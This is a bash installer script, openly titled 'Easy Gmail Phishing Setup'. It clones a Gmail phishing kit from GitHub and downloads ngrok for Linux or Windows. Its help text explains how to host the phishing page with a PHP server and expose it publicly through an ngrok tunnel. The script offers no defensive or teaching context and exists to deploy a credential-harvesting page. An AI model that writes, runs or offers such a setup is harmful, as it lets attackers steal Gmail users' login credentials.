#!/bin/bash
# Easy Gmail Phishing Setup
# Author: enigmatic-J

# The Gmail_Phishing repo belongs to ashanahw on github

if [[ $1 = "-l" ]]; then
	echo "Installing Phishing Tool"
	git clone https://github.com/enigmatic-J/Gmail_Phishing.git
	wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip
	unzip ngrok-stable-linux-386.zip
	rm ngrok-stable-linux-386.zip
elif [[ $1 = "-w" ]]; then
	echo "Installing Phishing Tool"
	git clone https://github.com/enigmatic-J/Gmail_Phishing.git
	wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip
	unzip ngrok-stable-windows-amd64.zip
	rm ngrok-stable-windows-amd64.zip
fi

if [[ $1 = "-h" ]]; then
	echo "Enter -l for linux installation"
	echo "Enter -w for windows installation"
	echo " "
	echo "Setting up phish:"
	echo "Type: php -S {server ip}:{server port}"
	echo "Open another terminal then go to where ngrok is located."
	echo "Type: ngrok http http://{server ip}:{server port}"
elif [[ $1 != "-h" ]]; then
	echo "Enter -h as argument for help"
	exit 0
fi
